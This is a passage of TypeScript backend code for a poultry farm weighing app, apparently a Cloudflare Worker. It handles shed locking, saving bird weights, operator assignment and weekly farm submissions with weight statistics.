                  lines,
                });
              }

              totalFarmBirds += shedBirdCount;
              const sws: any = swsMap.get(s.id);
              const isSaved = sws?.status === 'SAVED';
              if (isSaved) savedShedsCount++;

              const last = s.last_heartbeat_at ? new Date(s.last_heartbeat_at).getTime() : 0;
              const isLocked = Boolean(s.locked_by_user_id && last && (Date.now() - last <= 120_000) && (!s.locked_week || s.locked_week.toUpperCase() === targetWeek.toUpperCase()));

              sheds.push({
                id: s.id,
                name: s.name,
                locked: isLocked,
                lockedByUserId: isLocked ? s.locked_by_user_id : null,
                lockedByUserName: isLocked ? s.locked_by_user_name : null,
                lockedAt: isLocked ? s.locked_at : null,
                lastHeartbeatAt: isLocked ? s.last_heartbeat_at : null,
                // Stage 2: Team Visibility attributes strictly scoped to targetWeek
                savedStatus: isSaved ? 'SAVED' : (shedBirdCount > 0 ? 'DRAFT' : 'PENDING'),
                savedByUserId: isSaved ? (sws?.saved_by_user_id || null) : null,
                savedByUserName: isSaved ? (sws?.saved_by_user_name || null) : null,
                totalBirdCount: isSaved ? (sws?.total_bird_count || 0) : shedBirdCount,
                savedAt: isSaved ? (sws?.saved_at || null) : null,
                parts,
              });
            }

            const totalShedsCount = sheds.length;
            const allShedsSaved = totalShedsCount > 0 && savedShedsCount >= totalShedsCount;
            const selectedBatch = batchesList.find(b => b.id === targetBatchId) || activeBatch;

            // Fetch assigned user names for this farm
            const farmUsersRes = await env.DB.prepare('SELECT id, name, role, assigned_farms, assigned_farm_id FROM users').all().catch(() => ({ results: [] }));
            const farmAssignedUsers = ((farmUsersRes.results || []) as any[]).filter(u => {
              if (u.assigned_farm_id === farmId) return true;
              try {
                const list = JSON.parse(u.assigned_farms || '[]');
                return Array.isArray(list) && (list.includes(farmId) || list.includes(farm.name));
              } catch {
                return false;
              }
            });
            const assignedUserNames = farmAssignedUsers.map(u => {
              const r = (u.role || '').toUpperCase();
              const display = (r === 'ADMIN' || r === 'MANAGER') ? 'Manager' : (r === 'INCHARGE' ? 'In-Charge' : 'Supervisor');
              return `${u.name} (${display})`;
            });

            return jsonResponse({
              ...farm,
              ageWeek: targetWeek,
              activeBatch,
              batches: batchesList,
              currentBatch: selectedBatch,
              startDate: selectedBatch?.startDate || farm.flock_date,
              startWeekNumber: selectedBatch?.startWeekNumber || 1,
              status: subForWeek ? 'COMPLETED' : 'DRAFT',
              assignedUserNames,
              audit: subForWeek ? {
                status: 'COMPLETED',
                lastSubmittedAt: subForWeek.created_at,
                lastSubmittedBy: subForWeek.submitted_by,
                lastSubmittedRole: subForWeek.submitted_role,
                submittedBy: subForWeek.submitted_by,
                submittedRole: subForWeek.submitted_role,
                totalBirdsSubmitted: subForWeek.total_birds,
                batchId: subForWeek.batch_id,
                batchName: subForWeek.batch_name,
              } : null,
              farmProgress: {
                totalShedsCount,
                savedShedsCount,
                totalFarmBirds,
                allShedsSaved,
                progressPercent: totalShedsCount > 0 ? Math.round((savedShedsCount / totalShedsCount) * 100) : 0,
              },
              allShedsSaved,
              sheds,
            });
          }

          if (method === 'DELETE') {
            if (env.DB) {
              await env.DB.prepare('UPDATE farms SET is_archived = 1 WHERE id = ?').bind(farmId).run();
            }
            return jsonResponse({ success: true, message: 'Farm archived' });
          }
        }

        // POST /api/farms/:id/assign-operators - Assign Field Operators to Farm
        const farmAssignOperatorsMatch = path.match(/^\/farms\/([^/]+)\/assign-operators$/);
        if (farmAssignOperatorsMatch && method === 'POST') {
          const farmId = decodeURIComponent(farmAssignOperatorsMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const operatorUserIds: string[] = body.operatorUserIds || body.operatorIds || [];

          if (!Array.isArray(operatorUserIds)) {
            return errorResponse('operatorUserIds must be an array of user IDs', 400);
          }

          if (!env.DB) {
            return jsonResponse({
              success: true,
              farmId,
              assignedUserNames: [],
              count: 0,
            });
          }

          await ensureUsersTable(env);
          const farm = await env.DB.prepare('SELECT id, name FROM farms WHERE id = ?').bind(farmId).first() as any;
          if (!farm) {
            return errorResponse('Farm not found in database', 404);
          }

          // Query all users to update their farm assignments
          const allUsersRes = await env.DB.prepare(
            'SELECT id, name, role, assigned_farms, assigned_farm_id FROM users'
          ).all().catch(() => ({ results: [] }));
          const allUsers = (allUsersRes.results || []) as any[];

          const updatedAssignedUserNames: string[] = [];

          for (const user of allUsers) {
            const isManagerOrAdmin = (user.role || '').toUpperCase() === 'ADMIN' || (user.role || '').toUpperCase() === 'MANAGER';
            // Only update assignments for field operators or explicit target users
            const isTarget = operatorUserIds.includes(user.id);

            // Skip modifying Admin/Manager assignedFarms unless explicitly targeted
            if (isManagerOrAdmin && !isTarget) {
              continue;
            }

            const currentSet = new Set<string>();
            if (user.assigned_farms) {
              try {
                const parsed = JSON.parse(user.assigned_farms);
                if (Array.isArray(parsed)) {
                  parsed.forEach((item: string) => {
                    if (item && item !== '*') currentSet.add(item);
                  });
                }
              } catch {}
            }

            let newAssignedFarmId = user.assigned_farm_id;

            if (isTarget) {
              currentSet.add(farm.id);
              currentSet.add(farm.name);
              newAssignedFarmId = farm.id;
              const r = (user.role || '').toUpperCase();
              const displayRole = (r === 'ADMIN' || r === 'MANAGER') ? 'Manager' : (r === 'INCHARGE' ? 'In-Charge' : 'Supervisor');
              updatedAssignedUserNames.push(`${user.name} (${displayRole})`);
            } else {
              currentSet.delete(farm.id);
              currentSet.delete(farm.name);
              if (newAssignedFarmId === farm.id) {
                const remaining = Array.from(currentSet).filter(id => id.startsWith('farm-'));
                newAssignedFarmId = remaining.length > 0 ? remaining[0] : null;
              }
            }

            const newAssignedFarmsJson = JSON.stringify(Array.from(currentSet));
            await env.DB.prepare(
              'UPDATE users SET assigned_farm_id = ?, assigned_farms = ? WHERE id = ?'
            ).bind(newAssignedFarmId, newAssignedFarmsJson, user.id).run().catch(() => {});
          }

          return jsonResponse({
            success: true,
            farmId,
            assignedUserNames: updatedAssignedUserNames,
            count: updatedAssignedUserNames.length,
          });
        }

        // PUT /api/farms/:id/details
        const farmDetailsMatch = path.match(/^\/farms\/([^/]+)\/details$/);
        if (farmDetailsMatch && method === 'PUT') {
          const farmId = decodeURIComponent(farmDetailsMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          if (env.DB && body.name) {
            await env.DB.prepare('UPDATE farms SET name = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?').bind(body.name, farmId).run();
          }
          return jsonResponse({ success: true, message: 'Farm details updated' });
        }

        // PUT /api/farms/:id/sync
        const farmSyncMatch = path.match(/^\/farms\/([^/]+)\/sync$/);
        if (farmSyncMatch && method === 'PUT') {
          const farmId = decodeURIComponent(farmSyncMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          if (env.DB && body.sheds && Array.isArray(body.sheds)) {
            // Save state / sync lines
            for (const s of body.sheds) {
              for (const p of s.parts || []) {
                for (const l of p.lines || []) {
                  if (l.gender) {
                    await env.DB.prepare('UPDATE lines SET gender = ? WHERE id = ?').bind(l.gender.toUpperCase(), l.id).run().catch(() => {});
                  }
                }
              }
            }
          }
          return jsonResponse({ success: true, farmId });
        }

        // -------------------------------------------------------------
        // SHED CONCURRENCY LOCKING & OPERATOR ATTRIBUTION (LIVE-STATE)
        // -------------------------------------------------------------
        const liveStateFarmMatch = path.match(/^\/farms\/([^/]+)\/(?:shed-locks|live-state)$/);
        if (path === '/sheds/locks' || liveStateFarmMatch) {
          if (method === 'GET') {
            const farmIdParam = liveStateFarmMatch ? decodeURIComponent(liveStateFarmMatch[1]) : url.searchParams.get('farmId');
            const targetWeek = (url.searchParams.get('week') || 'W18').toUpperCase();
            const locks: Record<string, any> = {};
            let totalShedsCount = 0;
            let savedShedsCount = 0;
            let totalFarmBirdsCount = 0;

            if (env.DB) {
              await ensureShedWeekStatusTable(env);
              await ensureShedLockColumns(env);

              const allShedsRes = farmIdParam
                ? await env.DB.prepare('SELECT id, farm_id, name, locked_by_user_id, locked_by_user_name, locked_at, last_heartbeat_at, locked_week, locked_batch_id, recorded_by_user_id, recorded_by_user_name FROM sheds WHERE farm_id = ?').bind(farmIdParam).all().catch(() => ({ results: [] }))
                : await env.DB.prepare('SELECT id, farm_id, name, locked_by_user_id, locked_by_user_name, locked_at, last_heartbeat_at, locked_week, locked_batch_id, recorded_by_user_id, recorded_by_user_name FROM sheds').all().catch(() => ({ results: [] }));

              // Query shed saves for this week
              const swsRes = farmIdParam
                ? await env.DB.prepare('SELECT * FROM shed_week_status WHERE farm_id = ? AND UPPER(week) = ?').bind(farmIdParam, targetWeek).all().catch(() => ({ results: [] }))
                : await env.DB.prepare('SELECT * FROM shed_week_status WHERE UPPER(week) = ?').bind(targetWeek).all().catch(() => ({ results: [] }));
              
              const swsMap = new Map((swsRes.results || []).map((row: any) => [row.shed_id, row]));
              const shedsList = allShedsRes.results || [];
              totalShedsCount = shedsList.length;

              for (const s of shedsList) {
                const last = s.last_heartbeat_at ? new Date(s.last_heartbeat_at).getTime() : 0;
                const isLocked = Boolean(
                  s.locked_by_user_id &&
                  last &&
                  (Date.now() - last <= 120_000) &&
                  (!s.locked_week || s.locked_week.toUpperCase() === targetWeek)
                );
                const sws: any = swsMap.get(s.id);
                const isSaved = sws?.status === 'SAVED';
                if (isSaved) savedShedsCount++;

                const birdsInShed = sws?.total_bird_count || 0;
                totalFarmBirdsCount += birdsInShed;

                locks[s.id] = {
                  shedId: s.id,
                  shedName: s.name,
                  farmId: s.farm_id,
                  locked: isLocked,
                  lockedByUserId: isLocked ? s.locked_by_user_id : null,
                  lockedByUserName: isLocked ? s.locked_by_user_name : null,
                  lockedAt: isLocked ? s.locked_at : null,
                  lastHeartbeatAt: isLocked ? s.last_heartbeat_at : null,
                  // Stage 2: Team Visibility attributes strictly scoped to targetWeek
                  savedStatus: isSaved ? 'SAVED' : (birdsInShed > 0 ? 'DRAFT' : 'PENDING'),
                  savedByUserId: isSaved ? (sws?.saved_by_user_id || null) : null,
                  savedByUserName: isSaved ? (sws?.saved_by_user_name || null) : null,
                  totalBirdCount: birdsInShed,
                  savedAt: isSaved ? (sws?.saved_at || null) : null,
                  weights: sws?.weights_json ? (() => { try { return JSON.parse(sws.weights_json); } catch { return null; } })() : null,
                };
              }
            }

            const allShedsSaved = totalShedsCount > 0 && savedShedsCount >= totalShedsCount;
            return jsonResponse({
              locks,
              farmProgress: {
                totalShedsCount,
                savedShedsCount,
                totalFarmBirdsCount,
                allShedsSaved,
                progressPercent: totalShedsCount > 0 ? Math.round((savedShedsCount / totalShedsCount) * 100) : 0,
              },
              allShedsSaved,
              week: targetWeek,
              farmId: farmIdParam,
            });
          }
        }

        // -------------------------------------------------------------
        // PERMANENT SHED LOCK: BLOCK POST-CREATION RENAME & DELETE
        // -------------------------------------------------------------
        const singleShedMatch = path.match(/^\/sheds\/([^/]+)$/);
        if (singleShedMatch && (method === 'DELETE' || method === 'PUT' || method === 'PATCH')) {
          return errorResponse('Sheds are permanently locked at farm creation and cannot be renamed or deleted.', 403);
        }

        // POST /api/sheds/:shedId/enter
        const shedEnterMatch = path.match(/^\/sheds\/([^/]+)\/enter$/);
        if (shedEnterMatch && method === 'POST') {
          const shedId = decodeURIComponent(shedEnterMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const userId = body.userId || body.lockedByUserId || request.headers.get('x-user-id');
          const userName = body.userName || body.lockedByUserName || request.headers.get('x-user-username') || 'Incharge';
          const targetWeek = (body.week || request.headers.get('x-week') || '').toUpperCase() || null;
          const targetBatchId = body.batchId || null;

          if (!userId) {
            return errorResponse('Authentication required. Please log in.', 401);
          }

          if (env.DB) {
            await ensureShedLockColumns(env);
            const shed = await env.DB.prepare('SELECT * FROM sheds WHERE id = ?').bind(shedId).first() as any;
            if (!shed) return errorResponse('Shed not found', 404);

            const last = shed.last_heartbeat_at ? new Date(shed.last_heartbeat_at).getTime() : 0;
            const isLocked = Boolean(
              shed.locked_by_user_id &&
              last &&
              (Date.now() - last <= 120_000) &&
              (!shed.locked_week || !targetWeek || shed.locked_week.toUpperCase() === targetWeek)
            );

            if (shed.locked_by_user_id && shed.locked_by_user_id !== userId && isLocked) {
              return new Response(JSON.stringify({
                locked: true,
                lockedByUserId: shed.locked_by_user_id,
                lockedByUserName: shed.locked_by_user_name || 'Another Incharge',
                message: `⚠️ ${shed.name} is currently being weighed by ${shed.locked_by_user_name || 'another Incharge'}. Only one Incharge can enter a shed at a time.`
              }), {
                status: 409,
                headers: { 'Content-Type': 'application/json', ...CORS_HEADERS, ...NO_CACHE_HEADERS }
              });
            }

            const nowIso = new Date().toISOString();
            await env.DB.prepare(`
              UPDATE sheds SET 
                locked_by_user_id = ?, 
                locked_by_user_name = ?, 
                locked_at = ?, 
                last_heartbeat_at = ?,
                locked_week = ?,
                locked_batch_id = ?
              WHERE id = ?
            `).bind(userId, userName, nowIso, nowIso, targetWeek, targetBatchId, shedId).run().catch(() => {});

            await env.DB.prepare('UPDATE farms SET updated_at = CURRENT_TIMESTAMP WHERE id = ?').bind(shed.farm_id).run().catch(() => {});

            return jsonResponse({
              success: true,
              locked: true,
              shedId,
              shedName: shed.name,
              lockedByUserId: userId,
              lockedByUserName: userName,
              lockedAt: nowIso,
              lastHeartbeatAt: nowIso,
              week: targetWeek,
            });
          }

          return jsonResponse({ success: true, locked: true, shedId, lockedByUserId: userId, lockedByUserName: userName });
        }

        // POST /api/sheds/:shedId/heartbeat
        const shedHeartbeatMatch = path.match(/^\/sheds\/([^/]+)\/heartbeat$/);
        if (shedHeartbeatMatch && method === 'POST') {
          const shedId = decodeURIComponent(shedHeartbeatMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const userId = body.userId || body.lockedByUserId || request.headers.get('x-user-id');
          const targetWeek = (body.week || request.headers.get('x-week') || '').toUpperCase() || null;
          const nowIso = new Date().toISOString();

          if (env.DB) {
            const shed = await env.DB.prepare('SELECT * FROM sheds WHERE id = ?').bind(shedId).first() as any;
            if (!shed) return errorResponse('Shed not found', 404);

            const last = shed.last_heartbeat_at ? new Date(shed.last_heartbeat_at).getTime() : 0;
            const isLocked = Boolean(
              shed.locked_by_user_id &&
              last &&
              (Date.now() - last <= 120_000) &&
              (!shed.locked_week || !targetWeek || shed.locked_week.toUpperCase() === targetWeek)
            );

            if (userId && shed.locked_by_user_id && shed.locked_by_user_id !== userId && isLocked) {
              return new Response(JSON.stringify({
                locked: true,
                lockedByUserId: shed.locked_by_user_id,
                lockedByUserName: shed.locked_by_user_name,
                message: `⚠️ ${shed.name} is currently being weighed by ${shed.locked_by_user_name || 'another Incharge'}. Only one Incharge can enter a shed at a time.`
              }), {
                status: 409,
                headers: { 'Content-Type': 'application/json', ...CORS_HEADERS, ...NO_CACHE_HEADERS }
              });
            }

            await env.DB.prepare('UPDATE sheds SET last_heartbeat_at = ? WHERE id = ?').bind(nowIso, shedId).run().catch(() => {});
          }

          return jsonResponse({ success: true, shedId, lastHeartbeatAt: nowIso });
        }

        // POST /api/sheds/:shedId/leave
        const shedLeaveMatch = path.match(/^\/sheds\/([^/]+)\/leave$/);
        if (shedLeaveMatch && method === 'POST') {
          const shedId = decodeURIComponent(shedLeaveMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const recordedByUserId = body.recordedByUserId || body.userId;
          const recordedByUserName = body.recordedByUserName || body.userName;

          if (env.DB) {
            await env.DB.prepare(`
              UPDATE sheds SET 
                locked_by_user_id = NULL, 
                locked_by_user_name = NULL, 
                locked_at = NULL, 
                last_heartbeat_at = NULL,
                locked_week = NULL,
                locked_batch_id = NULL
              WHERE id = ?
            `).bind(shedId).run().catch(() => {});
          }

          return jsonResponse({ success: true, shedId, locked: false, recordedByUserId, recordedByUserName });
        }

        // POST /api/sheds/:shedId/force-unlock
        const shedForceUnlockMatch = path.match(/^\/sheds\/([^/]+)\/force-unlock$/);
        if (shedForceUnlockMatch && method === 'POST') {
          const shedId = decodeURIComponent(shedForceUnlockMatch[1]);
          if (env.DB) {
            await env.DB.prepare(`
              UPDATE sheds SET 
                locked_by_user_id = NULL, 
                locked_by_user_name = NULL, 
                locked_at = NULL, 
                last_heartbeat_at = NULL,
                locked_week = NULL,
                locked_batch_id = NULL
              WHERE id = ?
            `).bind(shedId).run().catch(() => {});
          }
          return jsonResponse({ success: true, shedId, locked: false, message: 'Shed forcibly unlocked' });
        }

        // -------------------------------------------------------------
        // STAGE 2: SHED-WISE "SAVE SHED" (TEAM VISIBLE, NOT SUBMISSION HISTORY)
        // -------------------------------------------------------------
        const shedSaveMatch = path.match(/^\/sheds\/([^/]+)\/save-shed$/);
        if (shedSaveMatch && method === 'POST') {
          const shedId = decodeURIComponent(shedSaveMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const targetWeek = (body.week || 'W18').toUpperCase();
          const userId = body.userId || body.savedByUserId || request.headers.get('x-user-id') || 'incharge-1';
          const userName = body.userName || body.savedByUserName || request.headers.get('x-user-username') || 'Incharge 1';
          let totalBirdCount = Number(body.totalBirdCount || 0);

          if (env.DB) {
            await ensureShedWeekStatusTable(env);
            await ensureBatchesTable(env);

            const shed = await env.DB.prepare('SELECT * FROM sheds WHERE id = ?').bind(shedId).first() as any;
            if (!shed) return errorResponse('Shed not found', 404);
            const farmId = shed.farm_id;

            const farm = await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).first() as any;
            const activeBatch = await ensureFarmActiveBatch(env, farm);
            const batchId = body.batchId || activeBatch?.id;

            // 1. Persist all bird weights recorded in that shed if weights array/map provided
            if (body.weights && Array.isArray(body.weights)) {
              let countedBirds = 0;
              for (const lineItem of body.weights) {
                if (!lineItem.lineId) continue;
                const lineId = lineItem.lineId;
                const lineWeights: number[] = Array.isArray(lineItem.weights) ? lineItem.weights : [];
                countedBirds += lineWeights.length;

                // Clear previous week weights for this line in this batch
                await env.DB.prepare(`
                  DELETE FROM bird_weights 
                  WHERE line_id = ? AND UPPER(week) = ? AND (batch_id = ? OR batch_id IS NULL)
                `).bind(lineId, targetWeek, batchId).run().catch(() => {});

                // Get line std
                const lineRow = await env.DB.prepare('SELECT std_weight_grams, gender FROM lines WHERE id = ?').bind(lineId).first() as any;
                const std = lineRow?.std_weight_grams || (lineRow?.gender === 'MALE' ? 150 : 140);

                for (let idx = 0; idx < lineWeights.length; idx++) {
                  const wVal = Number(lineWeights[idx]);
                  if (isNaN(wVal) || wVal <= 0) continue;
                  const wId = `w-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;
                  await env.DB.prepare(`
                    INSERT INTO bird_weights (id, line_id, entry_index, weight_grams, std_weight_at_entry, recorded_by, week, batch_id) 
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                  `).bind(wId, lineId, idx + 1, wVal, std, userName, targetWeek, batchId).run().catch(() => {});
                }
              }
              if (countedBirds > 0 || totalBirdCount === 0) {
                totalBirdCount = countedBirds;
              }
            } else if (!totalBirdCount) {
              // Query bird weights count for this shed and batch
              const countRes = await env.DB.prepare(`
                SELECT COUNT(bw.id) as total_birds
                FROM bird_weights bw
                JOIN lines l ON bw.line_id = l.id
                JOIN parts p ON l.part_id = p.id
                WHERE p.shed_id = ? AND UPPER(bw.week) = ? AND (bw.batch_id = ? OR bw.batch_id IS NULL)
              `).bind(shedId, targetWeek, batchId).first() as any;
              if (countRes && countRes.total_birds !== undefined) {
                totalBirdCount = countRes.total_birds;
              }
            }

            // 2. Mark shed status for that week as SAVED in shed_week_status with batch_id and weights_json
            const weightsJson = body.weights ? JSON.stringify(body.weights) : null;
            await env.DB.prepare(`
              INSERT INTO shed_week_status (shed_id, farm_id, week, status, saved_by_user_id, saved_by_user_name, total_bird_count, weights_json, batch_id, saved_at)
              VALUES (?, ?, ?, 'SAVED', ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
              ON CONFLICT(shed_id, week) DO UPDATE SET
                status = 'SAVED',
                saved_by_user_id = excluded.saved_by_user_id,
                saved_by_user_name = excluded.saved_by_user_name,
                total_bird_count = excluded.total_bird_count,
                weights_json = excluded.weights_json,
                batch_id = excluded.batch_id,
                saved_at = CURRENT_TIMESTAMP
            `).bind(shedId, farmId, targetWeek, userId, userName, totalBirdCount, weightsJson, batchId).run();

            // 3. Release active lock
            await env.DB.prepare(`
              UPDATE sheds SET
                locked_by_user_id = NULL,
                locked_by_user_name = NULL,
                locked_at = NULL,
                last_heartbeat_at = NULL,
                locked_week = NULL,
                locked_batch_id = NULL,
                recorded_by_user_id = ?,
                recorded_by_user_name = ?
              WHERE id = ?
            `).bind(userId, userName, shedId).run().catch(() => {});

            await env.DB.prepare('UPDATE farms SET updated_at = CURRENT_TIMESTAMP WHERE id = ?').bind(farmId).run().catch(() => {});

            // 4. Log to activity_logs
            const logId = `log-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`;
            await env.DB.prepare(`
              INSERT INTO activity_logs (id, farm_id, user_name, action, shed_name, sample_count)
              VALUES (?, ?, ?, 'SAVED_SHED', ?, ?)
            `).bind(logId, farmId, userName, shed.name, totalBirdCount).run().catch(() => {});
          }

          // CRITICAL: NEVER write to submissions table on save-shed!
          return jsonResponse({
            success: true,
            shedId,
            week: targetWeek,
            status: 'SAVED',
            savedByUserId: userId,
            savedByUserName: userName,
            totalBirdCount,
            message: `Shed saved successfully with ${totalBirdCount} birds. Visible to team.`
          });
        }

        // -------------------------------------------------------------
        // STAGE 3: OVERALL FARM "FINAL SUBMIT" (WRITES TO SUBMISSIONS TABLE)
        // -------------------------------------------------------------
        const farmWeekSubmitMatch = path.match(/^\/farms\/([^/]+)\/weeks\/([^/]+)\/submit$/);
        if (farmWeekSubmitMatch && method === 'POST') {
          const farmId = decodeURIComponent(farmWeekSubmitMatch[1]);
          const weekNumber = decodeURIComponent(farmWeekSubmitMatch[2]).toUpperCase();
          const body = await request.json().catch(() => ({})) as any;
          const submittedBy = body.submittedBy || body.userName || 'Field Supervisor';
          const submittedRole = body.submittedRole || body.userRole || 'SUPERVISOR';

          if (!env.DB) {
            return jsonResponse({ success: true, submissionId: `sub-${Date.now()}`, status: 'SUBMITTED', farmId, week: weekNumber });
          }

          await ensureShedWeekStatusTable(env);
          await ensureBatchesTable(env);

          const farm = await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).first() as any;
          if (!farm) return errorResponse('Farm not found', 404);

          const activeBatch = await ensureFarmActiveBatch(env, farm);
          const batchId = body.batchId || activeBatch?.id;
          const batchName = body.batchName || activeBatch?.batchName || 'Batch 1';

          // Aggregate all sheds, parts, lines, and weights for weekNumber and batchId
          const shedsRes = await env.DB.prepare('SELECT * FROM sheds WHERE farm_id = ?').bind(farmId).all();
          const allSheds = shedsRes.results || [];

          const shedWeekStatuses = await env.DB.prepare(`
            SELECT * FROM shed_week_status 
            WHERE farm_id = ? AND UPPER(week) = ? AND (batch_id = ? OR batch_id IS NULL)
          `).bind(farmId, weekNumber, batchId).all().catch(() => ({ results: [] }));
          const swsMap = new Map((shedWeekStatuses.results || []).map((s: any) => [s.shed_id, s]));

          let totalFarmBirds = 0;
          let allFemaleWeights: number[] = [];
          let allMaleWeights: number[] = [];
          const shedsBreakdown: any[] = [];

          for (const s of allSheds) {
            const sws: any = swsMap.get(s.id);
            const partsRes = await env.DB.prepare('SELECT * FROM parts WHERE shed_id = ?').bind(s.id).all();
            let shedBirdCount = 0;
            const partsList: any[] = [];

            for (const p of partsRes.results || []) {
              const linesRes = await env.DB.prepare('SELECT * FROM lines WHERE part_id = ? ORDER BY line_number ASC').bind(p.id).all();
              const linesList: any[] = [];

              for (const l of linesRes.results || []) {
                const weightsRes = await env.DB.prepare(`
                  SELECT weight_grams FROM bird_weights 
                  WHERE line_id = ? AND UPPER(week) = ? AND (batch_id = ? OR batch_id IS NULL) 
                  ORDER BY entry_index ASC
                `).bind(l.id, weekNumber, batchId).all();
                const weights = (weightsRes.results || []).map((w: any) => Number(w.weight_grams));

                shedBirdCount += weights.length;
                totalFarmBirds += weights.length;

                if (l.gender === 'FEMALE') {
                  allFemaleWeights.push(...weights);
                } else {
                  allMaleWeights.push(...weights);
                }

                linesList.push({
                  id: l.id,
                  name: l.name,
                  gender: l.gender,
                  stdWeight: l.std_weight_grams,
                  weights,
                  count: weights.length,
                });
              }

              partsList.push({
                id: p.id,
                name: p.name,
                lines: linesList,
              });
            }

            const effectiveBirdCount = shedBirdCount > 0 ? shedBirdCount : (sws?.total_bird_count || 0);
            if (shedBirdCount === 0 && effectiveBirdCount > 0) {
              totalFarmBirds += effectiveBirdCount;
            }

            shedsBreakdown.push({
              shedId: s.id,
              shedName: s.name,
              status: sws?.status || (effectiveBirdCount > 0 ? 'SAVED' : 'DRAFT'),
              savedByUserId: sws?.saved_by_user_id || s.recorded_by_user_id || null,
              savedByUserName: sws?.saved_by_user_name || s.recorded_by_user_name || 'Incharge',
              birdCount: effectiveBirdCount,
              parts: partsList,
            });
          }

          // Compute Statistics with grading bands (MB, B, S, A, MA) and CV%
          const parsedWeekNum = parseInt(weekNumber.replace(/\D/g, '') || '18', 10);
          const calcStats = (weights: number[], stdWeight: number = 140) => {
            const count = weights.length;
            if (count === 0) {
              return { 
                count: 0, avg: 0, stdDev: 0, cv: 0, uniformity: 0,
                grades: { MB: 0, B: 0, S: 0, A: 0, MA: 0 },
                gradePercents: { MB: 0, B: 0, S: 0, A: 0, MA: 0 }
              };
            }
            const avg = Math.round((weights.reduce((a, b) => a + b, 0) / count) * 10) / 10;
            const variance = count > 1 ? weights.reduce((acc, val) => acc + Math.pow(val - avg, 2), 0) / (count - 1) : 0;
            const stdDev = Math.round(Math.sqrt(variance) * 10) / 10;
            const cv = avg > 0 ? Math.round((stdDev / avg) * 10000) / 100 : 0;
            const inRange = weights.filter(w => w >= avg * 0.9 && w <= avg * 1.1).length;
            const uniformity = Math.round((inRange / count) * 1000) / 10;

            const tolerance = parsedWeekNum <= 3 ? 25 : parsedWeekNum <= 8 ? 50 : parsedWeekNum <= 14 ? 75 : 100;
            const sMin = stdWeight - tolerance;
            const sMax = stdWeight + tolerance;
            const bMin = stdWeight - 2 * tolerance;
            const aMax = stdWeight + 2 * tolerance;

            let mb = 0, b = 0, s = 0, a = 0, ma = 0;
            for (const w of weights) {
              if (w < bMin) mb++;
              else if (w < sMin) b++;
              else if (w <= sMax) s++;
              else if (w <= aMax) a++;
              else ma++;
            }

            return { 
              count, avg, stdDev, cv, uniformity,
              stdWeight,
              grades: { MB: mb, B: b, S: s, A: a, MA: ma },
              gradePercents: {
                MB: Math.round((mb / count) * 1000) / 10,
                B: Math.round((b / count) * 1000) / 10,
                S: Math.round((s / count) * 1000) / 10,
                A: Math.round((a / count) * 1000) / 10,
                MA: Math.round((ma / count) * 1000) / 10,
              }
            };
          };

          const femaleStats = calcStats(allFemaleWeights, 140);
          const maleStats = calcStats(allMaleWeights, 150);

          const snapshot = {
            submissionId: `sub-${Date.now()}`,
            farmId,
            farmName: farm.name,
            batchId,
            batchName,
            flockAge: weekNumber,
            season: farm.season || 'Summer',
            submittedAt: new Date().toISOString(),
            submittedBy,
            submittedRole,
            totalBirds: totalFarmBirds,
            femaleStats,
            maleStats,
            sheds: shedsBreakdown,
          };

          const submissionId = snapshot.submissionId;
          const dataJson = JSON.stringify(snapshot);
          const r2Key = `reports/${farmId}/${submissionId}.json`;

          // Write ONE single consolidated record to submissions with batch_id and batch_name
          await env.DB.prepare(`
            INSERT INTO submissions (id, farm_id, flock_age, season, total_birds, submitted_by, submitted_role, r2_report_key, data_json, batch_id, batch_name)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
          `).bind(submissionId, farmId, weekNumber, farm.season || 'Summer', totalFarmBirds, submittedBy, submittedRole, r2Key, dataJson, batchId, batchName).run();

          // R2 Storage archive if available
          const bucket = env.STORAGE_BUCKET || env.REPORT_BUCKET;
          if (bucket) {
            await bucket.put(r2Key, dataJson, {
              httpMetadata: { contentType: 'application/json' },
              customMetadata: { farmId, submissionId, submittedBy, week: weekNumber, batchName },
            }).catch(() => {});
          }

          // Activity Log
          const logId = `log-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`;
          await env.DB.prepare(`
            INSERT INTO activity_logs (id, farm_id, user_name, action, sample_count)
            VALUES (?, ?, ?, 'FARM_FINAL_SUBMIT', ?)
          `).bind(logId, farmId, submittedBy, totalFarmBirds).run().catch(() => {});

          return jsonResponse({
            success: true,
            submissionId,
            status: 'SUBMITTED',
            farmId,
            farmName: farm.name,
            batchId,
            batchName,
            week: weekNumber,
            totalBirds: totalFarmBirds,
            message: `Farm ${farm.name} (${batchName}) week ${weekNumber} overall submission completed successfully.`,
          }, 201);
        }

        // -------------------------------------------------------------
        // F. SUBMISSIONS & REPORTS (Cloudflare R2 + D1 15 GB+ Archive)
        // -------------------------------------------------------------
        if ((path === '/submissions' || path === '/submissions/') && method === 'POST') {
          const body = await request.json().catch(() => ({})) as any;
          const submissionId = `sub-${Date.now()}`;
          const farmId = body.farmId || 'default-farm';
          const flockAge = body.flockAge || 'W1';
          const submittedBy = body.metadata?.submittedBy || 'Supervisor';
          const submittedRole = body.metadata?.submittedRole || 'SUPERVISOR';
          const totalBirds = body.metadata?.totalBirds || 0;
          const dataJson = JSON.stringify(body);

          let r2Key = `reports/${farmId}/${submissionId}.json`;

          // Store full batch payload in Cloudflare R2 bucket
          const bucket = env.STORAGE_BUCKET || env.REPORT_BUCKET;
          if (bucket) {
            await bucket.put(r2Key, dataJson, {
              httpMetadata: { contentType: 'application/json' },
              customMetadata: {
                farmId,
                submissionId,
                submittedBy,
              },
            });
          }

          if (env.DB) {
            await env.DB.prepare(`
              INSERT INTO submissions (id, farm_id, flock_age, season, total_birds, submitted_by, submitted_role, r2_report_key, data_json)
              VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
